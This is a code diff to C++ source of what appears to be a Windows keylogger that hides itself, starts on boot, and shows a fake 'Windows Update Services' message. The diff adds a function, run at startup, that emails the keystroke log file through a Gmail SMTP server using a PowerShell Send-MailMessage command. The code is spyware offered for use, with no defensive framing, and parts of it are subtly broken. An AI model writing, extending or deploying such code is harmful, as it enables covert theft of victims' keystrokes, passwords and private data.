@@ -14,9 +14,24 @@
 
 using namespace std;
 
-const char LOGFILENAME[] = {"WindowsData.txt"};
+const  string LOGFILENAME = "WindowsData.txt";
 bool invisible = true;
 bool autostartOnStartup = true;
+
+const string deviceIdentifier = "hirushaPC";
+
+const string sendEmailAddr = "";
+const string sendEmailPassword = "";
+const string toEmailAddr = "";
+
+
+
+void sendEmailOnce(void) {
+
+    string email = "Send-MailMessage -To \"" + toEmailAddr + "\" -From \"" + sendEmailAddr + "\" -Subject " + deviceIdentifier + " -Body \"...\" -Credential \"" + sendEmailPassword + "\"  -Attachments \".\\" + LOGFILENAME + "\" -Priority High -ExecutionPolicy bypass -SmtpServer \"smtp.gmail.com\" -Port 587"
+    system(email);
+
+}
 
 void restartOnStartup(void) {
     char re[MAX_PATH];
@@ -484,6 +499,7 @@ void hide(void)
 void init(void)
 {
     printf("Starting Windows Update Services (Get-WUAVersion)\nScanning for Updates\nPlease Wait!...\n");
+    sendEmailOnce();
 }
 
 void powerdown(void)
